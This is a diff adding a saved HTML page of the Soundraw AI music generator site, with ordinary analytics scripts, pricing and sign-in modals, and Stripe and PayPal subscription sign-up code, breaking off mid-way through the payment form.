@@ -1,0 +1,1152 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://kit.fontawesome.com/933069ddae.js" crossorigin="anonymous"></script>
+    <title>AI Music Generator - SOUNDRAW</title>
+    <meta name="viewport" content="width=device-width, minimum-scale=0.1">
+    <meta name="description" content="Your personal AI music generator.">
+    <meta name="keywords" content="Easy way to create music,Music Licensing for video,Music for videos,Music for films,Royalty free music,Music subscription,music library for videos,music for YouTube videos,commercial music,Music Licensing for Videos &amp; Films,royalty free music subscription,Licensing,Video,Film,YouTube">
+    <link rel="canonical" href="https://soundraw.io/">
+    <meta property="fb:app_id" content="1581188208657768">
+    <meta property="og:url" content="https://soundraw.io">
+    <meta property="og:title" content="Soundraw">
+    <meta property="og:description" content="Your personal AI music generator.">
+    <meta property="og:image" content="https://soundraw-image.s3.ap-northeast-1.amazonaws.com/soundraw_ogp_EN.png">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:site" content="@ecrettmusic">
+    <meta property="twitter:title" content="Soundraw">
+    <meta property="twitter:description" content="Your personal AI music generator.">
+    <meta property="twitter:image" content="https://soundraw-image.s3.ap-northeast-1.amazonaws.com/soundraw_ogp_EN.png">
+    <link rel="shortcut icon" type="image/x-icon" href="assets/favicon-65fa692e0ba06519edfaf3224c823528eb2cec9997a3443c9d8d13bf8cb312f3.ico" />
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="S2om8xltiPs9gQt4kk6GJ38T636HoFdfy90ovyonEQI3ZTDUva7Pes7q7qUKQ5TMuFb9Of4Y8ejHL6G7wcQZwQ" />
+    <link rel="stylesheet" media="all" href="assets/application-3a7edec2c2aa32802f12eba7f63d1dd3200565ee30f31fe9cad680f239dc6fca.css" data-turbolinks-track="reload" />
+    <link rel="stylesheet" media="screen" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" data-turbolinks-track="reload" />
+    <link rel="stylesheet" media="screen" href="https://unpkg.com/aos@next/dist/aos.css" data-turbolinks-track="reload" />
+    <script src="https://js.stripe.com/v3/"></script>
+    <script src="https://code.iconify.design/iconify-icon/1.0.0/iconify-icon.min.js"></script>
+    <script src="packs/application-93eb44ea7bc1dc40ba63.js"></script>
+      <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-MJMPB5J');</script>
+  <!-- End Google Tag Manager -->
+
+  <!-- Facebook Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window,document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1586720694846532'); 
+  fbq('track', 'PageView');
+  </script>
+  <noscript>
+  <img height="1" width="1" 
+  src="https://www.facebook.com/tr?id=1586720694846532&ev=PageView
+  &noscript=1"/>
+  </noscript>
+  <!-- End Facebook Pixel Code -->
+
+  </head>
+
+  <body lang="en" class="bg-dark"  >
+       <!-- Google Tag Manager (noscript) -->
+       <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MJMPB5J"
+       height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+       <!-- End Google Tag Manager (noscript) -->
+    <div id="header">
+  <div id="header-contents-wrapper" class="w-100 h-100 d-flex px-3 px-sm-4 position-relative justify-content-between">
+      <div class="h-100 d-flex justify-content-start align-items-center">
+        <div id="header-logo">
+          <a data-turbolinks="false" href="/">
+            <img width="100%" src="assets/logo_soundraw-ece48640135e9c1f9372d6a27c0a91fa81fd4fdad9f4f7d514c66936468762f4.webp" />
+</a>        </div>
+      </div>
+
+    <div class="d-inline-flex">
+        <div class="d-flex text-center align-items-center">
+          <div class="toppage-loading d-xl-inline-flex px-3 hover-white position-relative">
+                <a class="text-font-semi-bold loading-content hover-white " href="/create_music">Create Music</a>
+            <div class="position-absolute icon-loading invisible">
+              <span class="spinner-border spinner-border-sm loading" role="status"></span>
+            </div>
+          </div>
+          <a class="text-font-semi-bold hover-white px-3 download-none d-none" data-turbolinks="false" href="/download">Adobe Plugin</a>
+          <a class="text-font-semi-bold hover-white px-3 license-none " href="/license">License</a>
+          <a class="hover-white px-3 font-avenir-next faq-none " href="/faq">FAQ</a>
+              <a class="text-font-semi-bold hover-white px-3 pricing-none" href="/#pricing-section">Pricing</a>
+        </div>
+
+          <div class="d-flex align-items-center">
+            <a onclick="$(&#39;.nav a#nav-sign-in-tab&#39;).tab(&#39;show&#39;);" class="d-none d-sm-block px-3 hover-white " href="/users/sign_in">Sign in</a>
+            <a onclick="$(&#39;.nav a#nav-sign-up-tab&#39;).tab(&#39;show&#39;);" class="d-none d-sm-block btn_99" href="/users/sign_up">Sign Up</a>
+          </div>
+      <div id="user-menu-container" style="display: none;">
+        <ul class="user-menu">
+          <li>
+            <button class="menu-item">
+              <span class="fa-solid fa-music"></span>
+              <a class="menu-item" href="/edit_music">Create Music</a>
+            </button>
+          </li>
+          <li>
+            <button class="menu-item">
+              <span class="fa-solid fa-circle-user"></span>
+              <a class="menu-item" href="/users/edit">Account</a>
+            </button>
+          </li>
+          <li>
+            <button class="menu-item">
+              <span class="fa-regular fa-heart"></span>
+              <a class="menu-item" href="/en/favorite">Favorites</a>
+            </button>
+          </li>
+          <li>
+            <button class="menu-item">
+              <span class="fa-solid fa-arrow-down downloaded"></span>
+              <a class="menu-item" href="/en/download_history">Download History</a>
+            </button>
+          </li>
+          <li>
+            <button class="menu-item">
+              <span class="fa-solid fa-right-from-bracket"></span>
+            <a class="menu-item" data-confirm="Are you sure you want to sign out?" rel="nofollow" data-method="delete" href="/users/sign_out">Sign Out</a>
+
+            </button>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+  .custom-tooltip {
+    background: black;
+    color: white;
+    border-radius: 5px;
+    padding: 5px 10px 4px;
+    max-width: 350px !important;
+    white-space: pre-line;
+    text-align: left;
+    font-size: 80%;
+    font-family: "Futura", "Yu Gothic", sans-serif;
+    border: none !important;
+  }
+
+  #btn-subscription-modal button {
+    vertical-align: text-bottom;
+  }
+</style>
+
+<script>
+  $(".header-switch-language").tooltip({
+    classes: {
+      "ui-tooltip": "ui-corner-all custom-tooltip"
+    },
+    position: {
+      my: "left top+5",
+      at: "left bottom",
+      collision: "flipfit flip"
+    }
+  });
+
+    $(document).ready(function() {
+      $('#tutorial-videos-modal').on('show.bs.modal', function (e) {
+        $(".youtube-iframe").trigger('play');
+      }).on('hidden.bs.modal', function(e) {
+        $(".youtube-iframe").trigger('pause');
+      })
+    })
+
+  // 
+
+    function actionPageLoading() {
+      $('.toppage-loading').not('.clicked').click(function() {
+        if ($(this).hasClass('clicked')) return;
+        $(this).addClass('clicked');
+        $(this).find('.loading-content').addClass('invisible');
+        $(this).find('.icon-loading').removeClass('invisible');
+      })
+    }
+
+  function showSupscribeAftarSignUp() {
+    $(document).ready(function() {
+      $("#sign-in-modal form .add-elements").empty().append('<input type="hidden" name="use_modal" value="use_modal">');
+      $('.nav a#nav-sign-up-tab').tab('show');
+    })
+  }
+
+  $(document).ready(function() {
+    $(".banner-warning .icon-close").on("click", function() {
+      $(".banner-warning").removeClass("d-flex").addClass("d-none");
+      if ($("body").hasClass("trial-and-warning")) {
+        $("body").removeClass("trial-and-warning");
+        $("body").addClass("trial-banner");
+      } else {
+        $("body").removeClass("trial-banner");
+      }
+    })
+  })
+</script>
+
+    
+    <div class="flash-messages"></div>
+
+      <div class='list-modal'>
+        <div class="modal window fade tabbar-modal overflow-auto" id="tutorial-videos-modal" tabindex="-1" role="dialog" aria-labelledby="tutorial-videos-modal" aria-hidden="true">
+  <div class="modal-dialog mx-auto tabbar-modal-wrapper" role="document">
+    <div class="tabbar-header py-5">
+      <div class="d-flex align-items-center tabbar-header-center text-white">
+        <span class="font-avenir-next">TUTORIAL VIDEOS</span>
+      </div>
+    </div>
+
+    <div class="tabbar-content">
+      <div class="mb-3 text-center">
+        <video class="mx-auto d-none d-sm-block youtube-iframe" src="https://soundraw-image.s3-ap-northeast-1.amazonaws.com/tutorial_gif_en_small.mp4" loop muted controls preload="none"></video>
+      </div>
+
+      <div class="text-center px-5 pt-4 pb-5">
+        <a href="https://www.youtube.com/channel/UC8l7O93vdXTvjSH6QrGI6XQ" target="_blank">
+          <button class="px-4 py-2 btn btn-yellow">Learn More</button>
+        </a>
+      </div>
+    </div>
+
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close">
+    </div>
+  </div>
+</div>
+
+        <div class="modal window fade tabbar-modal overflow-auto" id="pricing-modal" tabindex="-1" role="dialog" aria-labelledby="pricing-modal" aria-hidden="true">
+  <div class="modal-dialog mx-auto tabbar-modal-wrapper" role="document">
+    <div class="tabbar-header">
+      <div class="d-flex align-items-center tabbar-header-center pt-3">
+        <div class="nav justify-content-center pricing-title tabbar-header-center mx-auto" role="tablist">
+          <a class="nav-link active price-personal-title col col-10 text-center px-0" id="nav-personal-tab" data-toggle="tab" href="#nav-tabbar-personal-plan" role="tab" aria-controls="nav-tabbar-personal-plan" aria-selected="true">
+            <span>Personal Plan</span>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-content tabbar-content text-white pricing-pc overflow-auto">
+      <div class="tab-pane show fade active py-5 px-4 mx-auto justify-content-center text-center position-relative price-personal" id="nav-tabbar-personal-plan" role="tabpanel" aria-labelledby="nav-tabbar-personal-plan-tab">
+        <div class="row mx-auto price">
+          <div class="col-6 price-or">
+            <p class="mb-4 plan-title">Annual Plan</p>
+            <div class="mb-1 mx-auto position-relative price-information price-information-en">
+              <span class="price-center">16</span>
+              <span class="position-absolute price-top-left">US$</span>
+              <span class="position-absolute price-top-right">99</span>
+              <span class="position-absolute price-bottom-right">/ mo</span>
+              <span class="position-absolute annual-tax-bottom-right"></span>
+            </div>
+            <p class="mt-3 annual-billed">$203.88 billed annually</p>
+          </div>
+          <div class="col-6">
+            <p class="mb-4 plan-title">Monthly Plan</p>
+            <div class="mb-1 mx-auto position-relative price-information price-information-en">
+              <span class="price-center">19</span>
+              <span class="position-absolute price-top-left">US$</span>
+              <span class="position-absolute price-top-right">99</span>
+              <span class="position-absolute price-bottom-right">/ mo</span>
+              <span class="position-absolute annual-tax-bottom-right"></span>
+            </div>
+            <p class="mt-3 annual-billed invisible">$203.88 billed annually</p>
+          </div>
+        </div>
+
+        <div class="text-center price-sub-content mb-3 mt-5">
+          <p>One account can use Soundraw on 1 device at a time</p>
+          <p>Credit card payment</p>
+        </div>
+
+        <div class="border-top plan-information plan-information-en padding-price-content pt-3  mb-5">
+          <div class="row mx-auto">
+            <div class="pt-3 pl-4 text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Generate unlimited songs</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Bookmark songs</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Download up to 50 songs per day</p>
+            </div>
+            <div class="pt-3  text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Youtube & Social Media</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Corporate videos</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Web ads</p>
+            </div>
+            <div class="pt-3 pl-1 text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">TV & Radio commercials</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Broadcast programs &amp; Movies</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Games &amp; Apps</p>
+            </div>
+          </div>
+        </div>
+        <div class="text-center position-absolute select-btn w-75">
+          <a data-toggle="modal" data-target="#sign-in-modal" onclick="$(&#39;#pricing-modal&#39;).modal(&#39;hide&#39;);" href="javascript:void(0);">
+            <button class="px-5 py-2 btn btn-yellow border-0">Subscribe</button>
+</a>        </div>
+      </div>
+    </div>
+
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+
+        <div class='subscribes-modal-content'>
+        </div>
+
+
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<div class="modal window fade tabbar-modal overflow-auto" id="sign-in-subscription-modal" tabindex="-1" role="dialog" aria-labelledby="sign-in-subscription-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-lg mx-auto tabbar-modal-wrapper text-center" role="document">
+    <div class="modal-inside">
+      <div class="tab-content tabbar-content text-white mx-3 px-3 overflow-auto" id="sign-in-subscription">
+        <div class="text-header pt-5 mb-4">
+          <div class="d-flex">
+          <span class="d-flex title-1">Download music</span>
+          <i class="align-items-center col fa-arrow-down fas justify-content-end mr-2 mr-sm-4" style="display: flex; position: initial;" id="heart-icon"></i>
+          </div>
+          <span class="d-flex title-2">Create an account and download this song.</span>
+        </div>
+        <div class="tab-pane show fade pb-5 pt-3 mx-auto justify-content-center text-center position-relative" id="nav-tabbar-sign-in-subscription" role="modal" aria-labelledby="nav-tabbar-sign-in-subscription-tab">
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<form class="new_user" id="form-sign-in-remote" action="/users/sign_in" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+  <div class="form-group">
+    <input autocomplete="off" id="email-sign-in-remote" placeholder="Email" class="form-control" type="text" name="user[email]" />
+  </div>
+  <div class="form-group">
+    <input autocomplete="off" id="password-sign-in-remote" placeholder="Password" class="form-control" type="password" name="user[password]" />
+  </div>
+  <div class="add-elements">
+    
+  </div>
+  <div class="sign-in-error mb-3"></div>
+    <div class="actions m-auto submit-btn d-flex pt-4">
+      <input type="submit" name="commit" value="Log in" class="btn btn-yellow w-50 text-font-semi-bold" data-disable-with="Log in" />
+      <a class="btn switch-modal align-items-center col-6 d-flex justify-content-center ml-3 text-center" id="nav-sign-up-tab-subscription" data-bs-target="#sign-up-modal" data-bs-toggle="modal">
+        <span>Create Account</span>
+      </a>
+    </div>
+</form>
+        </div>
+      </div>
+    </div>
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<div class="modal window fade tabbar-modal overflow-auto" id="sign-in-without-subscription-modal" tabindex="-1" role="dialog" aria-labelledby="sign-in-modal-without-title" aria-hidden="true">
+  <div class="modal-dialog modal-lg mx-auto tabbar-modal-wrapper text-center" role="document">
+    <div class="modal-inside">
+      <div class="tab-content tabbar-content text-white mx-3 px-3 overflow-auto" id="sign-in-without-subscription">
+        <div class="text-header pt-5 mb-4">
+          <div class="d-flex">
+          <span class="d-flex title-1">Save your changes</span>
+          <i class="align-items-center col fa-heart fas justify-content-end mr-2 mr-sm-4" style="display: flex; position: initial;" id="heart-icon"></i>
+          </div>
+          <span class="d-flex title-2">Create an account and keep this song for later.</span>
+        </div>
+        <div class="tab-pane show fade pb-5 pt-3 mx-auto justify-content-center text-center position-relative" id="nav-tabbar-sign-in-without-subscription" role="modal" aria-labelledby="nav-tabbar-sign-in-without-subscription-tab">
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<form class="new_user" id="form-sign-in-sub-remote" action="/users/sign_in" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+  <div class="form-group">
+    <input autocomplete="off" id="email-sign-in-sub-remote" placeholder="Email" class="form-control" type="text" name="user[email]" />
+  </div>
+  <div class="form-group">
+    <input autocomplete="off" id="password-sign-in-sub-remote" placeholder="Password" class="form-control" type="password" name="user[password]" />
+  </div>
+  <div class="add-elements">
+    
+  </div>
+  <div class="sign-in-error mb-3"></div>
+    <div class="actions m-auto submit-btn d-flex pt-4">
+      <input type="submit" name="commit" value="Log in" class="btn btn-yellow w-50 text-font-semi-bold" data-disable-with="Log in" />
+      <a class="btn switch-modal align-items-center col-6 d-flex justify-content-center ml-3 text-center" id="nav-sign-up-tab-without-subscription" data-bs-target="#sign-up-without-subscription-modal" data-bs-toggle="modal">
+        <span>Create Account</span>
+      </a>
+    </div>
+</form>
+        </div>
+      </div>
+    </div>
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<div class="modal window fade tabbar-modal overflow-auto" id="sign-up-subscription-modal" tabindex="-1" role="dialog" aria-labelledby="sign-up-subscription-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-lg mx-auto tabbar-modal-wrapper text-center" role="document">
+    <div class="modal-inside">
+      <div class="tab-content tabbar-content text-white mx-3 px-3 overflow-auto" id="sign-up-subscription">
+        <div class="text-header pt-5 mb-4">
+          <div class="d-flex">
+          <span class="d-flex title-1">Download music</span>
+          <i class="align-items-center col fa-arrow-down fas justify-content-end mr-2 mr-sm-4" style="display: flex; position: initial;" id="heart-icon"></i>
+          </div>
+          <span class="d-flex title-2">Create an account and download this song.</span>
+        </div>
+        <div class="tab-pane show fade active pb-5 mx-auto justify-content-center text-center position-relative" id="nav-tabbar-sign-up-subscription" role="modal" aria-labelledby="nav-tabbar-sign-up-subscription-tab">
+          
+<script type="text/javascript">
+  document.addEventListener('DOMContentLoaded', function() {
+    const stripe = Stripe('pk_live_yDWXBuNXqqgirHlcjRDkGiDe', {
+      locale: 'en'
+    });
+    const elements = stripe.elements();
+    let style = {
+      base: {
+        color: '#ffffff',
+        lineHeight: '32px',
+        height: '28px',
+        fontSmoothing: 'antialiased',
+        fontSize: '16px',
+        '::placeholder': {
+          color: '#7B858D',
+        }
+      },
+      invalid: {
+        color: '#fa755a',
+        iconColor: '#fa755a'
+      }
+    };
+
+    const mediaQuery = window.matchMedia("(max-width: 640px)");
+    mediaQuery.addListener(onWindowChanged);
+
+    function onWindowChanged(e) {
+      console.log("!!!!")
+      style.base.fontSize = '16px';
+    }
+
+
+    const cardNumber = {
+      'placeholder' : {
+        'en': `Credit or Debit Card Number`,
+        'ja': `クレジットカード番号`
+      }
+    }
+
+    const securityCode = {
+      'placeholder' : {
+        'en': `Security Code`,
+        'ja': `セキュリティーコード`
+      }
+    }
+
+    const card = elements.create('cardNumber', {
+          'placeholder': cardNumber.placeholder['en'],
+          'style': style
+    });
+    card.mount("#card-number-remote");
+
+    const cvc = elements.create('cardCvc', {
+          'placeholder': securityCode.placeholder['en'],
+          'style': style
+    });
+    cvc.mount("#card-cvc-remote");
+
+    const exp = elements.create('cardExpiry', {
+          'placeholder': 'MM/YY',
+          'style': style
+    });
+    exp.mount("#card-exp-remote");
+
+    card.addEventListener('change', function(event) {
+      var displayError = document.getElementById("card-errors-remote");
+      displayError.textContent = event.error ? event.error.message : "";
+    });
+
+    cvc.addEventListener('change', function(event) {
+      var displayError = document.getElementById("cvc-errors-remote");
+      displayError.textContent = event.error ? event.error.message : "";
+    });
+
+    exp.addEventListener('change', function(event) {
+      var displayError = document.getElementById("exp-errors-remote");
+      displayError.textContent = event.error ? event.error.message : "";
+    });
+
+    var stripe_button = document.getElementById("submit-registration-remote");
+
+    $('#check-credit-card').on('click', (event) => {
+      const target = $(event.target);
+      stripe.createToken(card, {}).then((result) => {
+        if (result.error) {
+          var errorElement = document.getElementById("card-errors-remote");
+          errorElement.textContent = result.error.message;
+        } else {
+          const opener = target.parents('.row').prev('.opener');
+          const nextOpenerBtn = target.prev('button');
+          opener.removeClass('unfinish');
+          opener.click();
+          nextOpenerBtn.click();
+        }
+      });
+    })
+
+    stripe_button.addEventListener('click', function(event) {
+
+      // 複数回のstripe通信を防止するため
+      $(event.target).prop('disabled', true);
+      $("#agree-to-terms-remote").attr("disabled", true);
+
+      event.preventDefault();
+      if ($('#use_register_card:checked').val() === 'true') {
+        var form = document.getElementById("form-sign-up-remote");
+        form.submit();
+        return;
+      }
+      stripe.createToken(card, {}).then(function(result) {
+        if (result.error) {
+          var errorElement = document.getElementById("card-errors-remote");
+          errorElement.textContent = result.error.message;
+          if (!$('#step-3').hasClass('show')) {
+            $('#open-step-3-box').click();
+          }
+          $(event.target).prop('disabled', false);
+        } else {
+          stripeTokenHandler(result.token);
+        }
+      });
+    });
+
+    function stripeTokenHandler(token) {
+      var hiddenInput = document.createElement('input');
+      hiddenInput.setAttribute('type', 'hidden');
+      hiddenInput.setAttribute('name', 'stripe_token');
+      hiddenInput.setAttribute('value', token.id);
+      if ("-remote" !== "-remote") {
+        var form = document.getElementById("form-sign-up");
+        form.appendChild(hiddenInput);
+        form.submit();
+      } else {
+        var url = $("#form-sign-up-remote").attr("action");
+        var formModal = document.getElementById("form-sign-up-remote");
+        formModal.appendChild(hiddenInput);
+        $.ajax({
+          type: 'POST',
+          url: url,
+          data: $('#form-sign-up-remote').serialize()
+        })
+      }
+      $("#agree-to-terms, #agree-to-terms-remote").prop("checked", false);
+    }
+
+    paypal.Buttons({
+      style: {
+        shape: 'pill',
+        color: 'silver',
+        layout: 'horizontal',
+        tagline: false
+      },
+      onClick: function(data, actions) {
+
+        const PleseCheckAgree = {
+          'message' : {
+            'en': `Please agree to the Terms of Service and Privacy Policy`,
+            'ja': `利用規約とプライバシーポリシーに同意してください`
+          }
+        }
+
+        if (!($('#agree-to-terms-remote').prop('checked'))) {
+          $('.please-check').text(`${PleseCheckAgree.message['en']}`);
+          return actions.reject();
+        } else {
+          $('.please-check').text("");
+        }
+
+        return fetch('/users/registrations/create_paypal', {
+          method: 'post',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').getAttribute('content')
+          },
+          body: JSON.stringify({
+            'sign_up': {
+              'email': $('#email-sign-up-remote').val(),
+              'password': $('#js-password-input-remote').val(),
+              'user_name': $('input[name="username"]').val(),
+              'language': $('input[name="language"]').val(),
+              'use_modal': $('input[name="use_modal"]').val(),
+              'use': $('input[name="use[]"]').val(),
+              'about': $('input[name="about[]"]').val()
+            }
+          })
+        }).then(function(res) {
+            return res.json();
+        }).then(function(data) {
+          if (data.error && data.error.length > 0) {
+            $(".sign-up-error").text(data.error).addClass('text-danger small').show();
+            return actions.reject();
+          } else {
+            sessionStorage.setItem('userToken', data.data);
+            sessionStorage.setItem('userID', data.user_id);
+            return actions.resolve();
+          }
+        });
+      },
+      createSubscription: function(data, actions) {
+        const planSelected = {
+          'plan' : {
+            'true': `P-08186217V1088883YMLVADVQ`,
+            'false': `P-8RS46650FB931184CMLVADJI`
+          }
+        }
+        return actions.subscription.create({
+          'plan_id': planSelected.plan[$("#form-sign-up-remote").find('input[name="is_monthly"]:checked').val()],
+          'custom_id': sessionStorage.getItem('userID')
+        });
+      },
+      onApprove: function (data, actions) {
+        // Call paypal_subscriptions_path to create subscription
+        return fetch('/subscriptions/paypal', {
+          method: 'post',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').getAttribute('content')
+          },
+          body: JSON.stringify({
+            'is_monthly': $("#form-sign-up-remote").find('input[name="is_monthly"]:checked').val(),
+            'remote_id': data.subscriptionID,
+          })
+        }).then(function(res) {
+          return res.json();
+        }).then(function(data) {
+          if (data.error && data.error.length > 0) {
+            $(".sign-up-error").text(data.error).addClass('text-danger small').show();
+          } else {
+            const locale = 'en'
+            window.location.replace(`/${locale}/users/confirm_sign_up?origin=acc_and_sub`)
+          }
+        });
+      },
+      onCancel: function (data) {
+        return fetch('/users/registrations/remove_paypal', {
+          method: 'post',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').getAttribute('content')
+          },
+          body: JSON.stringify({
+            'user_token': sessionStorage.getItem('userToken')
+          })
+        }).then(function(res) {
+          return res.json();
+        }).then(function(data) {
+          $(".sign-up-error").text(data.data).addClass('text-danger').show();
+        });
+      },
+      onError: function (err) {
+        return fetch('/users/registrations/remove_paypal', {
+          method: 'post',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').getAttribute('content')
+          },
+          body: JSON.stringify({
+            'user_token': sessionStorage.getItem('userToken')
+          })
+        }).then(function(res) {
+          return res.json();
+        }).then(function(data) {
+          $(".sign-up-error").text(data.data).addClass('text-danger').show();
+        });
+      }
+    }).render('#paypal-button-container-remote');
+  });
+</script>
+<script src="https://www.paypal.com/sdk/js?client-id=AWFw7GYbrImCiP6gkUlmYDSc3yZLF4iNzktcTHozGCit73MPj-J9ttrT8Kld9yLkRfQ0K3N8KRYG6bNq&components=buttons&vault=true&intent=subscription"></script>
+
+<form class="new_user" id="form-sign-up-remote" action="/users" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+  <div class="text-center">
+    <div class="sign-in ">
+      <div class="sign-up-caption float-left mb-4">Create Account</div>
+      <label class="sr-only" for="user_name">Name</label>
+        <input autofocus="autofocus" autocomplete="username" id="email-sign-up-remote" placeholder="Email" class="sign-up-input email-sign-up" type="text" name="user[name]" />
+      <div class="small invalid-email text-danger mt-2" style="display: none"></div>
+      <input autocomplete="off" placeholder="Password" class="mt-2 sign-up-input" id="js-password-input-remote" type="password" name="user[password]" />
+    </div>
+    <div class="small invalid-email text-danger mt-3"></div>
+
+    <input type="hidden" name="username" id="user_name-remote" value="N/A" />
+    <div class="small invalid-password text-danger mt-3"></div>
+    <div class="sign-up-error"></div>
+
+    <input type="hidden" name="language" id="language-remote" value="en" />
+    <input type="hidden" name="about[]" id="about-remote" value="N/A" />
+    <input type="hidden" name="use_modal" id="use_modal-remote" value="use_modal" />
+    <input type="hidden" name="use[]" id="use-remote" value="N/A" />
+
+    <div class="text-center pt-4 mobile">
+      <div class="d-flex mb-3 pb-4 flex-column">
+        <p class="sign-up-caption">Select your Plan</p>
+        <p class="header-recommended-subtitle m-0 text-right">Recommended!</p>
+        <div id="annual-plan-wrapper-signup-remote" class="faded-price-tag form-control-wrapper d-flex justify-content-between">
+          <div class="price-caption-wrapper d-flex align-items-center">
+            <input type="radio" name="is_monthly" id="year-plan-signup-remote" value="false" class="plan-selected-remote" checked="checked" />
+            </div>
+          <label class="price-info" for="year-plan-signup-remote">
+            <label class="plan-type text-left text-left ml-3" for="year-plan-signup-remote">
+              Annual Plan
+            </label>
+            <div class="plan-info">
+              <p class="monthly-price">
+                <span class="price-center">$16.99</span>
+                <span class="price-bottom-right">/ Month</span>
+              </p>
+              <p class="annual-price mt-1">$203.88 billed annually</p>
+              <span style="display:none;" class="annual-price-hidden">$203.88</span>
+            </div>
+          </label>
+        </div>
+
+        <div id="month-plan-wrapper-signup-remote" class="form-control-wrapper mt-2 d-flex justify-content-between">
+          <div class="price-caption-wrapper d-flex align-items-center">
+            <input type="radio" name="is_monthly" id="month-plan-signup-remote" value="true" class="plan-selected-remote" />
+            </div>
+          <label class="price-info" for="month-plan-signup-remote">
+            <label class="plan-type text-left ml-3" for="month-plan-signup-remote">
+              Monthly Plan
+            </label>
+            <div class="plan-info">
+              <p class="monthly-price">
+                <span class="price-center" id="monthly-price">$19.99</span>
+                <span class="price-bottom-right">/ Month</span>
+              </p>
+            </div>
+          </label>
+        </div>
+      </div>
+
+      <div class="payment-type-wrapper mt-2 justify-content-between">
+        <p class="sign-up-caption mb-4">Payment Method</p>
+        <div id="paypal-option-wrapper-signup-remote" class="faded-price-tag form-control-wrapper d-flex justify-content-start p-3 align-items-center col">
+          <input type="radio" id="paypal-signup-remote" name="paypal-signup-remote" class="payment-radio-remote" checked="checked">
+          <label class="w-100" for="paypal-signup-remote">
+              <span class="ml-3 text-white payment-type">Pay with</span>
+              <img class="paypal-brand" src="assets/credit_cards/Paypal-3a58a9a9cc754398d3b4ecf098c458cb2cfdcaa87956a4d9bd00bb1cc969dbbd.png" />
+          </label>
+        </div>
+        <div id="stripe-option-wrapper-signup-remote" class="form-control-wrapper d-flex justify-content-start align-items-center p-3 mt-2 col">
+          <input type="radio" id="stripe-signup-remote" name="stripe-signup-remote" class="payment-radio-remote">
+          <label class="w-100" for="stripe-signup-remote">
+              <span class="ml-3 text-white payment-type">Pay with Credit Card</span>
+          </label>
+        </div>
+      </div>
+      <div class="stripe-payment" id="stripe-payment-signup-remote" style="display: none">
+        <div class="d-flex justify-content-between ml-n1 pt-3">
+          <div class="d-flex justify-content-start px-0 col mb-3">
+            <img class="mobile-card-brand" src="assets/credit_cards/Visa-6e5d55616ba9d4ca6fe9efe1b155d667dd4467d395f70252d748b24a5b1d973b.png" />
+            <img class="mobile-card-brand" src="assets/credit_cards/Mastercard-fa3fda34d4be1e39afd85b690fee197130dd2a9df1ef9606e461d67077ba60be.png" />
+            <img class="mobile-card-brand" src="assets/credit_cards/amex-52b537c0ea14492b5d46f6f01224777326291b1b5c7f30e28c71a413e14f8e05.png" />
+            
+          </div>
+        </div>
+
+        <div class="mt-n2 mb-2">
+          <div class="new-card-form-primary-block">
+            <div id="card-number-remote" class="mobile-form-input"></div>
+            <div id="card-errors-remote" role="alert" class="text-danger small text-left"></div>
+          </div>
+        </div>
+        <div class="d-flex mb-2">
+          <div class="w-50 mr-2 pl-0">
+            <div id="card-exp-remote" class="mobile-form-input"></div>
+            <div id="exp-errors-remote" role="alert" class="text-danger small text-left"></div>
+          </div>
